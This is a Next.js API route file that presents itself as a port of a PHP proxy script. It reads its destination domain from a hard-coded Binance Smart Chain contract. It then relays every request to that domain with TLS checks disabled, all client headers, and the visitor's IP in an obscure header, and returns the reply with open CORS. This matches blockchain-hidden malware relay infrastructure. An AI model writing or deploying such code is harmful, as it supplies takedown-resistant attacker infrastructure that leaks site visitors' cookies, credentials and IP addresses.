import { NextRequest, NextResponse } from 'next/server'
import axios from 'axios'
import https from 'https'
import crypto from 'crypto'

/**
 * Disable SSL verification (equivalent to CURLOPT_SSL_VERIFYPEER => false and CURLOPT_SSL_VERIFYHOST => false).
 * If you don't need this, remove `rejectUnauthorized: false`.
 */
const httpsAgent = new https.Agent({ rejectUnauthorized: false })

/**
 * Type for in-memory cache storage
 */
type DomainCache = {
    domain: string
    timestamp: number
}

/**
 * Store cache in memory (module-level global variable).
 * This cache is reset when the application restarts.
 */
let inMemoryCache: DomainCache | null = null

/**
 * Updates every 60 seconds (same as before).
 */
const updateInterval = 60 // seconds

/**
 * Function to get client IP address (equivalent to getClientIP in PHP).
 */
function getClientIP(req: NextRequest): string {
    const forwarded = req.headers.get('x-forwarded-for')
    if (forwarded) {
        return forwarded.split(',')[0].trim()
    }
    if (req.ip) {
        return req.ip
    }
    return 'unknown'
}

/**
 * Convert hex string from smart contract to regular string.
 */
function hexToString(hex: string): string {
    // Remove "0x"
    hex = hex.replace(/^0x/, '')

    // Shift by 64 characters (offset)
    hex = hex.substring(64)

    // Next 64 characters represent length
    const lengthHex = hex.substring(0, 64)
    const length = parseInt(lengthHex, 16)

    // Main data
    const dataHex = hex.substring(64, 64 + length * 2)

    let result = ''
    for (let i = 0; i < dataHex.length; i += 2) {
        const charCode = parseInt(dataHex.substring(i, i + 2), 16)
        if (charCode === 0) break
            result += String.fromCharCode(charCode)
    }

    return result
}

/**
 * Get domain from smart contract via RPC.
 * Uses an array of RPC addresses.
 */
async function fetchTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // This is hex "20965255"
    const data = '20965255'

    for (const rpcUrl of rpcUrls) {
        try {
            const response = await axios.post(
                rpcUrl,
                {
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [
                        {
                            to: contractAddress,
                            data: `0x${data}`,
                        },
                        'latest',
                    ],
                },
                {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 120000,
                    httpsAgent,
                    validateStatus: () => true,
                }
            )

            if (response.data?.error) {
                // If response contains error field - try next RPC
                continue
            }

            const resultHex = response.data?.result
            if (!resultHex) {
                continue
            }

            const domain = hexToString(resultHex)
            if (domain) {
                return domain
            }
        } catch (error) {
            // Try next RPC
        }
    }

    throw new Error('Could not fetch target domain')
}

/**
 * Returns domain from cache, or updates if cache is stale.
 */
async function getTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // Check if anything exists in memory
    if (inMemoryCache) {
        const diff = Math.floor(Date.now() / 1000) - inMemoryCache.timestamp
        if (diff < updateInterval) {
            // Cache is still valid
            return inMemoryCache.domain
        }
    }

    // Otherwise, fetch again
    const domain = await fetchTargetDomain(rpcUrls, contractAddress)

    // Update in memory
    inMemoryCache = {
        domain,
        timestamp: Math.floor(Date.now() / 1000),
    }

    return domain
}

/**
 * Proxy handler that replicates the logic of your PHP script (except disk writing).
 */
async function handleProxy(req: NextRequest, endpoint: string) {
    // RPC and contract settings (defaults)
    const rpcUrls = ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed2.bnbchain.org']
    const contractAddress = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0'

    // Get domain (cached in memory)
    let domain = await getTargetDomain(rpcUrls, contractAddress)
    domain = domain.replace(/\/+$/, '') // remove trailing slash

    endpoint = endpoint.replace(/^\/+/, '') // remove leading slashes
    const finalUrl = `${domain}/${endpoint}`

    // Request method
    const method = req.method

    // Equivalent to file_get_contents('php://input')
    const bodyBuffer = await req.arrayBuffer()
    const body = Buffer.from(bodyBuffer)

    // Collect headers, remove host/origin etc.
    const outHeaders: Record<string, string> = {}
    req.headers.forEach((value, key) => {
        const lowerKey = key.toLowerCase()
        if (
            ['host', 'origin', 'accept-encoding', 'content-encoding'].includes(lowerKey)
        ) {
            return
        }
        outHeaders[lowerKey] = value
    })

    // Add x-dfkjldifjljfjd = IP
    outHeaders['x-dfkjldifjljfjd'] = getClientIP(req)

    // Proxy through axios
    try {
        const response = await axios({
            url: finalUrl,
            method,
            headers: outHeaders,
            data: body,
            responseType: 'arraybuffer',
            httpsAgent,
            decompress: true,
            maxRedirects: 5,
            timeout: 120000,
            validateStatus: () => true,
        })

        const responseData = response.data as Buffer
        const statusCode = response.status
        const contentType = response.headers['content-type']

        // Prepare response headers
        const resHeaders: Record<string, string> = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
        }

        if (contentType) {
            resHeaders['Content-Type'] = contentType
        }

        return new NextResponse(responseData, {
            status: statusCode,
            headers: resHeaders,
        })
    } catch (error) {
        return new NextResponse('error: ' + String(error), {
            status: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            },
        })
    }
}

/**
 * OPTIONS - returns 204 + CORS
 */
export async function OPTIONS() {
    return new NextResponse(null, {
        status: 204,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Max-Age': '86400',
        },
    })
}

/**
 * Universal handler for GET/POST/etc.
 */
async function handleRequest(req: NextRequest) {
    const { searchParams } = new URL(req.url)
    const e = searchParams.get('e')

    // Ping check
    if (e === 'ping_proxy') {
        return new NextResponse('pong', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' },
        })
    }

    // Otherwise proxy if e is set
    if (e) {
        const endpoint = decodeURIComponent(e)
        return handleProxy(req, endpoint)
    }

    // Otherwise 400
    return new NextResponse('Missing endpoint', { status: 400 })
}

// Export methods
export async function GET(req: NextRequest) {
    return handleRequest(req)
}
export async function POST(req: NextRequest) {
    return handleRequest(req)
}
export async function PUT(req: NextRequest) {
    return handleRequest(req)
}
export async function DELETE(req: NextRequest) {
    return handleRequest(req)
}
export async function PATCH(req: NextRequest) {
    return handleRequest(req)
}
export async function HEAD(req: NextRequest) {
    return handleRequest(req)
}
